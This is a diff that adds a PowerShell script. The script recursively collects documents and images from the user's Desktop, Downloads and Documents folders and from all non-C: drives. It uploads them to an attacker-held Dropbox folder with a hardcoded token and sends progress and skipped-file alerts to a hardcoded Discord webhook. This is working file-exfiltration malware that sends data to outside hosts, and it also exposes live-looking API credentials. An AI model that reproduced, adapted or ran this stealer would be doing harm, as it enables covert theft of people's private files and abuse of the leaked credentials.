@@ -1,0 +1,159 @@
+# Enable TLS 1.2 for secure connection
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+# Define constants
+$DROPBOX_ACCESS_TOKEN = "sl.u.AFuWDH1tBqFysTXxnDi2VxP5l4tEprQD0PjY94BaLAZxrUaDmpw9ojsoZw-F6VbKje86uOeTDobbgt0wAhbC8Aj-9md-Fyy3635DehKX6erPCsT2o3EmhAApkFv1iZdEjF_pRygxOKvSjKYRJiP-M3FaGcp81GmJUejHE4d0_0iseMz6toobVXJ2e6UGIeTFw1lvk5OrdraeLEvXGgDzNg04LhxODU4l7kg4iUqyxrqYmhV97IyWpcH4eBZClLLhYHG9Rj5KVFzLPtAqomdznO5Rs-gZESX8FejhY7lucKifA0nxfFxoDEA0QXLB_enpvDeUwedyxvyNFQJ8DJWUCmuMD1385ky1Kz5565Thw9yIruWf27vuygToWZuEMR1I7iw0Em0urCtgmvtZOSQUH_oLv43PPuPU2JP6VlS5ZaaorVfMryood-JR_8IsY6AJTHzgqamZ7zRHGH9CyyoSQTe2vQ9WFKo8w40BP4nTV9RinPaQhbWN7ZYbxerRMjqoEVr8pt4KHOVDxeT6DsOA2qlXSHZTAp1muwADB_bKhFOXSSrgVLss23DC0NEAXeu-U7J4Faiw_oA2aICREuPjm8YhzvLWA0SVLHaFmMn_h0hy4GXz7DvhfiVczqbQZ0kJWd-vpmn44DcZ9dKRDA6TQ0_yP7Vnmkuf7pJi0ZvhGkLYiNYfMHAxpkM7bnECXCGr21zRfSm-J6IJBXVhE8-6wUCJkfsll6iz0HvEb-NMITMEF1Ty08rLLenoFjMxa6T2Uz6e8t8K5VuOqIxuLwW9CTb6IKmptUJJOTfPbGCbiW4c9Fgqz9mEesheVZoi6hwlW1OWy19zpPgbxVpC7XEHbwMbeEHSyudmgIBAXiQFG37h7FDOf9-o4-P1TY3Q75dIzb8EX88w17RyFghKiHjBWc-hnawzb_B9HEP6adnfV-aOy0MrCa8F6vm8LFKqsrgG_U2yFyD3jarosF1KcYBW3QQMEjxbrAdKfquc2xWnd27YGkafF21dKTP2t7uFdjzofUcEjqcVzhgQYm-pixbvF9Hlz864Jcg-m98EvMcLna0i6SIa4Wt6tWoH9X8LIuRz5h7MvHtGw4Bp64xy_XgwcPmUrsAEoJ4cTNhUzqCQBPa0SP7yjJc2d_yo6biUEvyOSkjlktw1_UOKOcMsOGNwsrLdRgcZFS3yARjFxZRkowkr-Fwak6IyjKZldIBDlcm4Mg1TFn07OiQI8qwGJAVXhtwo4REc01Jwyh3OJZTcdUa7uRYxr8LEnA1FTbB1Jw30G4PD6ZNZyrd4ZT3yiUr8d3DgMRqOkoHAjyJwOdmUXwsAwtaRXMUexBu_4v_ev6OYVeJknO-szpl30c3FNtI5Clrb4jiYU-8GR2Txs8AEHe0ZBmoy4Ji4qLceS3h8ABMj98NYGKup8ens77_jz5ULlOif"  # Replace with your real token
+$UPLOAD_HISTORY_FILE = "uploaded_files.txt"
+$DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1336197364951679078/Lkk9fGJXNkre_jS7A35CEg3yl0Mrlw4eygh3hhbA1zhM_KpGf6T3xAn2csDWJt3oTimF"    # Replace with your real webhook
+
+# Load uploaded files (by hash)
+function Load-UploadedFiles {
+    $uploadedFiles = @{}
+    if (Test-Path $UPLOAD_HISTORY_FILE) {
+        Get-Content $UPLOAD_HISTORY_FILE | ForEach-Object { $uploadedFiles[$_] = $true }
+    }
+    return $uploadedFiles
+}
+
+# Save uploaded file hashes
+function Save-UploadedFiles($uploadedFiles) {
+    $uploadedFiles.Keys | Set-Content $UPLOAD_HISTORY_FILE
+}
+
+# Compute SHA-256 hash of a file
+function Hash-File($filePath) {
+    $sha256 = [System.Security.Cryptography.SHA256]::Create()
+    $fileStream = [System.IO.File]::OpenRead($filePath)
+    $hashBytes = $sha256.ComputeHash($fileStream)
+    $fileStream.Close()
+    return [BitConverter]::ToString($hashBytes) -replace "-", ""
+}
+
+# Clean file name to avoid encoding issues
+function Clean-FileName($fileName) {
+    return [System.Text.Encoding]::UTF8.GetString([System.Text.Encoding]::UTF8.GetBytes($fileName))
+}
+
+# Upload file to Dropbox
+function Upload-ToDropbox($filePath) {
+    try {
+        $fileName = Clean-FileName([System.IO.Path]::GetFileName($filePath))
+        $dropboxPath = "/Msn_cell/$fileName"
+
+        $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
+        $fileSize = $fileBytes.Length
+
+        $headers = @{
+            "Authorization"    = "Bearer $DROPBOX_ACCESS_TOKEN"
+            "Content-Type"     = "application/octet-stream"
+            "Dropbox-API-Arg"  = ('{"path": "' + $dropboxPath + '", "mode": "add", "autorename": true, "mute": false}')
+        }
+
+        $response = Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" -Method Post -Headers $headers -Body $fileBytes -ErrorAction Stop
+
+        if ($response) {
+            Write-Host "Uploaded: $fileName"
+            return $fileSize
+        }
+    } catch {
+        Write-Host "Failed to upload: $fileName | Error: $_"
+    }
+    return 0
+}
+
+# Send a Discord notification for total uploaded
+function Send-DiscordAlert($uploadedSizeMB) {
+    try {
+        $message = @{ "content" = "TOTAL UPLOADED: $uploadedSizeMB MB" } | ConvertTo-Json -Compress
+        Invoke-RestMethod -Uri $DISCORD_WEBHOOK_URL -Method Post -Body $message -ContentType "application/json" -ErrorAction SilentlyContinue
+    } catch {
+        Write-Host "Failed to send Discord alert | Error: $_"
+    }
+}
+
+# Send a Discord alert for large skipped files
+function Send-LargeFileAlert($filePath, $sizeMB) {
+    try {
+        $message = @{ "content" = "SKIPPED LARGE FILE: $filePath ($sizeMB MB)" } | ConvertTo-Json -Compress
+        Invoke-RestMethod -Uri $DISCORD_WEBHOOK_URL -Method Post -Body $message -ContentType "application/json" -ErrorAction SilentlyContinue
+    } catch {
+        Write-Host "Failed to send alert for large file: $filePath"
+    }
+}
+
+# Get user folders (Desktop, Downloads, Documents)
+function Get-UserFolders {
+    $userProfile = [System.Environment]::GetFolderPath("UserProfile")
+    return @("$userProfile\Desktop", "$userProfile\Downloads", "$userProfile\Documents")
+}
+
+# Get available drives (excluding C:\)
+function Get-AvailableDrives {
+    Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Root -ne "C:\" } | Select-Object -ExpandProperty Root
+}
+
+# Search and upload files
+function Search-AndUpload($rootPath, $fileExtensions, $uploadedFiles, [ref]$totalUploaded, [ref]$lastAlertTime) {
+    Get-ChildItem -Path $rootPath -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.Extension -in $fileExtensions } | ForEach-Object {
+        $filePath = $_.FullName
+        $fileSizeMB = [math]::Round($_.Length / 1MB, 2)
+
+        if ($fileSizeMB -gt 100) {
+            Send-LargeFileAlert $filePath $fileSizeMB
+            Write-Host "SKIPPED LARGE FILE: $filePath ($fileSizeMB MB)"
+            return
+        }
+
+        $fileHash = Hash-File $filePath
+        if ($uploadedFiles.ContainsKey($fileHash)) {
+            Write-Host "Skipping already uploaded file: $filePath"
+            return
+        }
+
+        Write-Host "Found new file: $filePath"
+        $uploadedSize = Upload-ToDropbox $filePath
+        if ($uploadedSize -gt 0) {
+            $uploadedFiles[$fileHash] = $true
+            Save-UploadedFiles $uploadedFiles
+            $totalUploaded.Value += [math]::Round($uploadedSize / 1MB, 2)
+
+            if ((Get-Date) - $lastAlertTime.Value -ge (New-TimeSpan -Minutes 5)) {
+                Send-DiscordAlert $totalUploaded.Value
+                $lastAlertTime.Value = Get-Date
+            }
+
+            Write-Host "Waiting 5 seconds before next upload..."
+            Start-Sleep -Seconds 5
+        }
+    }
+}
+
+# Main Execution
+$uploadedFiles = Load-UploadedFiles
+$totalUploaded = 0
+$lastAlertTime = Get-Date
+
+# Define file extensions to search for
+$fileExtensions = @(".pdf", ".txt", ".xls", ".xlsx", ".doc", ".docx", ".ppt", ".pptx", ".jpg", ".png", ".jpeg")
+
+# Search user folders
+$folders = Get-UserFolders
+foreach ($folder in $folders) {
+    if (Test-Path $folder) {
+        Write-Host "Searching in: $folder"
+        Search-AndUpload $folder $fileExtensions $uploadedFiles ([ref]$totalUploaded) ([ref]$lastAlertTime)
+        Write-Host "Done with: $folder"
+    } else {
+        Write-Host "Skipping missing folder: $folder"
+    }
+}
+
+# Search additional drives (excluding C:\)
+$drives = Get-AvailableDrives
+foreach ($drive in $drives) {
+    Write-Host "Searching in drive: $drive"
+    Search-AndUpload $drive $fileExtensions $uploadedFiles ([ref]$totalUploaded) ([ref]$lastAlertTime)
+    Write-Host "Done with drive: $drive"
+}
+
+Write-Host "Upload process complete. Total uploaded: $totalUploaded MB"
